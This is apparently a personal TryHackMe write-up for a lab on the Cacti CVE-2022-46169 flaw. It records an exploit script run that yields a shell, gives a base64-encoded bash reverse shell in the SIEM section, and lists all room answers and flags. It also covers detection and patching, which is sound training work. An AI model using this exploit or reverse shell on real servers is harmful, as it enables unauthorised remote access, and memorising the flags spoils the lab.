
<h1 align="center">Cactus</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/a4f1fa34-dbe0-4172-868d-48180fe34961"><br>
<em>Bypass authentication and execute commands remotely on Cacti using CVE-2022-46169.</em>.<br>
Access it <a href="https://tryhackme.com/room/cactus">here</a>.<br><br>
July 20, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
and I’m excited to join you on this adventure, part of my <code>440</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="1200px" src="https://github.com/user-attachments/assets/0620d218-255f-42ab-86fb-b97c9cab81a5"></p>


<br>

<h2>Task 1 . Introduction</h2>
<p>Last December 2022, a security advisory was released regarding a critical vulnerability affecting all Cacti versions before 1.2.3. The vulnerability, branded as CVE-2022-46169, has been assigned a CVSS score of 9.8, indicating its critical severity. This high rating stems from the potential for malicious actors to exploit an unauthenticated, remote code execution vulnerability, thereby enabling unauthorised access to affected systems.

<p>Last December 2022, a security advisory was released regarding a critical vulnerability affecting all Cacti versions before 1.2.3. The vulnerability, branded as CVE-2022-46169, has been assigned a CVSS score of 9.8, indicating its critical severity. This high rating stems from the potential for malicious actors to exploit an unauthenticated, remote code execution vulnerability, thereby enabling unauthorised access to affected systems.</p>

<h3>Connecting to the machine</h3>
<p>[ ... ]</p>

<p>IMPORTANT: While the web browser (i.e., Chromium) might immediately start after boot up, it may show tabs that have "Connection Refused" displayed. This is because the Elastic Stack takes a few more minutes to finish starting up after the VM has completely booted up. Please walk through the tasks on Exploitation with the AttackBox, and Kibana should be ready by the time you reach Task 5.</p>

<br>
<h3 align="left"> Answer the question below</h3>

<p>1.1. I have prepared the virtual machines needed for this room.<br>
<code>No answer needed</code></p>


<br>

<h2>Task 2 . Exploitation - Authentication Bypass</h2>

<br>
<h3 align="left"> Answer the question below</h3>

<p>2.1. What is the HTTP header used to bypass the authentication on remote_agent.php?<br>
<code>X-Forwarded-For</code></p>


<h3>nmap</h3>

<p>

- <code>  22</code> : SSH<br>
- <code>  80</code> : http<br>
- <code>3306</code> : MariaDB<br>
- <code>6001</code> : X11<br>
- <code>17777</code> : sw-orion?<br>
- <code>18888</code> : Apache ... CentOS<br>
</p>

```bash
:~/Cactus# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
...
80/tcp    open  http      nginx 1.20.1
|_http-server-header: nginx/1.20.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
3306/tcp  open  mysql     MariaDB (unauthorized)
5601/tcp  open  esmagent?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /spaces/enter
|     x-content-type-options: nosniff
|     referrer-policy: no-referrer-when-downgrade
|     content-security-policy: script-src 'unsafe-eval' 'self'; worker-src blob: 'self'; style-src 'unsafe-inline' 'self'
|     kbn-name: ip-10-10-123-167
|     kbn-license-sig: e5e9cc9dacbe58ab9641e48e0392a6bd9f198a5181d5e37f30d96193fc6809c9
|     cache-control: private, no-cache, no-store, must-revalidate
|     content-length: 0
|     Date: Sun, 20 Jul 2025 xx:xx:xx GMT
|     Connection: close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: no-referrer-when-downgrade
|     Content-Security-Policy: script-src 'unsafe-eval' 'self'; worker-src blob: 'self'; style-src 'unsafe-inline' 'self'
|     kbn-name: ip-xx-xx-xxx-xxx7
|     kbn-license-sig: e5e9cc9dacbe58ab9641e48e0392a6bd9f198a5181d5e37f30d96193fc6809c9
|     content-type: application/json; charset=utf-8
|     cache-control: private, no-cache, no-store, must-revalidate
|     content-length: 60
|     Date: Sun, 20 Jul 2025 xx:xx:xx GMT
|     Connection: close
|_    {"statusCode":404,"error":"Not Found","message":"Not Found"}
6001/tcp  open  X11       (access denied)
17777/tcp open  sw-orion?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.6.8
|     Date: Sun, 20 Jul 2025 xx:xx:xx GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 472
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.6.8
|     Date: Sun, 20 Jul 2025 xx:xx:xx GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
18888/tcp open  http      Apache httpd 2.4.6 ((CentOS) PHP/7.3.33)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.33
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

<h3>SSH</h3>

```bash
:~/Cactus# ssh user@TargetIP
...
[user@ip-xx-xx-xxx-xxx ~]$ id
uid=1000(user) gid=1000(user) groups=1000(user)
[user@ip-xx-xx-xxx-xxx ~]$ pwd
/home/user
[user@ip-xx-xx-xxx-xxx ~]$ 
```

<br>

<h2>Task 3 . Exploitation - Command Injection</h2>

<br>
<h3 align="left"> Answer the questions below</h3>

<p>3.1. What is the name of the hidden folder located in /var/www/html?<br>
<code>f39f9db5a7695930f1b267a4d33b092b</code></p>

<br>


<p>3.2. What is the name of the hidden folder located in /var/www/html?<br>
<code>THM{de0c87d30debe82e7747c594574db1eb}</code></p>

<br>

<img width="942" height="284" alt="image" src="https://github.com/user-attachments/assets/e49e5c53-23cd-4fc5-9f76-c7474ea9e7e5" />

<img width="951" height="494" alt="image" src="https://github.com/user-attachments/assets/ca02ffc9-81b5-4c87-a2e3-955b28834aea" />

<img width="791" height="296" alt="image" src="https://github.com/user-attachments/assets/ef1cfe12-0d50-4add-9ac4-0c101fb59e67" />

<img width="1043" height="395" alt="image" src="https://github.com/user-attachments/assets/d666f4ab-c937-45c8-9c43-5e3d7058ddae" />


<br>

<img width="1043" height="290" alt="image" src="https://github.com/user-attachments/assets/c538b2b1-950b-4559-a000-457f252762c8" />

<br>

<img width="1052" height="503" alt="image" src="https://github.com/user-attachments/assets/42b607e3-d78d-4a52-85c9-1b77d369d5f2" />


<br>

<img width="1053" height="494" alt="image" src="https://github.com/user-attachments/assets/b0ab852f-72fd-4a11-be27-7c2aedcf68b7" />

<br>

<img width="945" height="620" alt="image" src="https://github.com/user-attachments/assets/50f6ac5f-a059-4409-988f-78bd54ff8772" />

<br>

<img width="892" height="435" alt="image" src="https://github.com/user-attachments/assets/6d2c9b1d-ea06-42b5-83a1-84a3106cec1e" />

<br>

<img width="952" height="497" alt="image" src="https://github.com/user-attachments/assets/5683fa5f-14fa-415d-b68d-914821ba8855" />

```bash
:~/Cactus# pip3 install httpx
```

```bash
:~/Cactus# python3 51166.py -u http://10.10.123.167/cacti/ -i 10.10.60.163 -p 4444
200 - [{"value":"168","rrd_name":"proc","local_data_id":"1"}]
200 - [{"value":"1min:1.55 5min:1.55 10min:1.60","rrd_name":"","local_data_id":"2"}]
200 - [{"value":"0","rrd_name":"users","local_data_id":"3"}]
200 - [{"value":"178896","rrd_name":"mem_buffers","local_data_id":"4"}]
200 - [{"value":"9427704","rrd_name":"mem_swap","local_data_id":"5"}]
200 - []
200 - []
200 - []
200 - []
200 - []
200 - []
200 - []
200 - []
```

<img width="883" height="135" alt="image" src="https://github.com/user-attachments/assets/bbddef71-00a4-4200-b90b-1c40b5329bf4" />


```bash
bash-4.2$ cd /var/www/html
cd /var/www/html
bash-4.2$ ls
ls
PHPIDS
cacti
f39f9db5a7695930f1b267a4d33b092b
index.php
bash-4.2$ ls -lah
ls -lah
total 8.0K
drwx------.  5 apache apache   90 Jul 20  2023 .
drwxr-xr-x.  4 root   root     33 Jul 19  2023 ..
drwxr-xr-x   7 apache apache  196 Jul 20  2023 PHPIDS
drwxrwxr-x. 20 apache apache 4.0K Aug 14  2022 cacti
drwxr-xr-x.  2 apache apache   22 Jul 19  2023 f39f9db5a7695930f1b267a4d33b092b
-rw-r--r--.  1 apache apache    0 Jul 19  2023 index.php
bash-4.2$ cd f39f9db5a7695930f1b267a4d33b092b
cd f39f9db5a7695930f1b267a4d33b092b
bash-4.2$ ls
ls
flag.txt
bash-4.2$ cat flag.txt
cat flag.txt
THM{de0c87d30debe82e7747c594574db1eb}
```

<br>

<h2>Task 4 . Detection - Log Analysis and Alerting</h2>

<br>
<h3 align="left"> Answer the questions below</h3>

<p>4.1. What is the Source IP of the adversary that successfully exploited the vulnerability last July 20?<br>
<code>10.10.135.237</code></p>

<br>

<p>4.2. What is the base64-decoded flag being submitted by this adversary?<br>
<code>THM{d0nT_4g3t_b64_d3c0d3}</code></p>

<br>

<p>4.3. What is the original value of default-path-rule that must be replaced with  /etc/suricata/rules?<br>
<code>/var/lib/suricata/rules</code></p>

<br>

<h2>Task 5 . Detection - Security Event and Information Management (SIEM)</h2>

<br>
<h3 align="left"> Answer the questions below</h3>


<p>5.1. What field handled the value remote_agent.php in the Elastic Query string?</p>
<code>url.original</code></p>

<br>

<p>5.2. Excluding the localhost IPs, what is the Source IP of the adversary that exploited the vulnerability last July 20, 2023?</p>
<code>10.10.135.237</code></p>

<br>

<p>5.3.Excluding entries from the localhost IPs, what is the encoded base64 string used by the attacker during the exploitation attempt last July 20, 2023?</p>
<code>YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTM1LjIzNy8zMTMzNyA8JjEn</code></p>

<br>

<img width="997" height="174" alt="image" src="https://github.com/user-attachments/assets/63e7f4f8-505a-44a1-8339-c3a3908cda0e" />

<img width="995" height="648" alt="image" src="https://github.com/user-attachments/assets/d79c429a-fe4a-4131-acdb-c2e26ed78966" />

<img width="997" height="395" alt="image" src="https://github.com/user-attachments/assets/f78cdd54-c055-4a05-bd0f-1310a38db4ef" />

<br>

<img width="996" height="148" alt="image" src="https://github.com/user-attachments/assets/7a0fc30c-d8c2-4f36-b525-9ebef281f9c8" />

<img width="998" height="649" alt="image" src="https://github.com/user-attachments/assets/a882b7b2-cfa7-4e62-9706-17be15bba17d" />

<br>

<img width="998" height="653" alt="image" src="https://github.com/user-attachments/assets/098b1e01-12d0-4972-b20b-a933e745e19b" />


<br>

<h2>Task 6 . Mitigation - Industry Practices and Advanced Methods</h2>

<br>
<h3 align="left"> Answer the questions below</h3>


<p>6.1. Based on the patch, what is the function used to restrict the input on poller_id parameter to integers only?</p>
<code>get_filter_request_var</code></p>

<br>

<p>6.2. Based on the patch, what is the function used to sanitize strings which helps in preventing command injection?</p>
<code>cacti_escapeshellarg</code></p>

<br>

<p>6.3. Based on the patch, what is the function that was modified to prevent the authentication bypass?</p>
<code>get_client_addr</code></p>

<br>

<h2>Task 7 . Conclusion</h2>

<br>
<h3 align="left"> Answer the question below</h3>

<p>7.1. I enjoyed the room!</p>
<code>No answer needed</code></p>

<br>
<br>


<img width="1915" height="904" alt="image" src="https://github.com/user-attachments/assets/cc0739f0-e4a9-428f-99cb-7b749a9e5a61" />

<img width="1899" height="901" alt="image" src="https://github.com/user-attachments/assets/75d46428-aca1-4145-b61d-c7fd86ab5d32" />




